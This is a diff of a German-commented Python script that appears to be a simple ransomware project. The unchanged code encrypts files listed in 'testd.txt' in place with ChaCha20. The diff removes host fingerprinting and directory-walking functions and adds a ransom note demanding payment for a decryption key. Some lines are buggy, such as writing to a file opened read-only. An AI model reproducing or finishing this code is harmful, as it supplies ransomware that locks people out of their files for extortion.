@@ -5,44 +5,6 @@ from cryptography.hazmat.backends import default_backend
 import platform
 import socket
 
-def kenndaten():
-    kenndaten = open("daten.txt", "w")
-    # Betriebssystem
-    os_name = platform.system()
-    print("Betriebssystem:", os_name)
-    kenndaten.write(os_name+"\n")
-    # Computername
-    computer_name = platform.node()
-    print("Computername:", computer_name)
-    kenndaten.write(computer_name+"\n")
-    # Prozessorinformationen
-    processor = platform.processor()
-    print("Prozessor:", processor)
-
-    # Hostname
-    hostname = socket.gethostname()
-    print("Hostname:", hostname)
-
-    # IP-Adresse
-    ip_address = socket.gethostbyname(hostname)
-    print("IP-Adresse:", ip_address)
-    kenndaten.write(ip_address+"\n")
-    # CPU-Auslastung
-
-
-
-
-def list_files_directories(path, depth=0):
-    if depth > 4:
-        return
-
-    for entry in os.scandir(path):
-        if entry.is_file():
-            print("File:", entry.path)
-        elif entry.is_dir():
-            print("Directory:", entry.path)
-            list_files_directories(entry.path, depth + 1)
-
 
 def encrypt_file_chacha20(key, input_file, output_file):
     # Generiere einen zufälligen Nonce
@@ -75,4 +37,7 @@ with open("testd.txt", "r") as file:
         print(line)
         encrypt_file_chacha20(key, line, line)
 
+
+readme = open("README")
+readme.write("Your System has been encrypted, please pay 1€ to receive the decryption key")
 
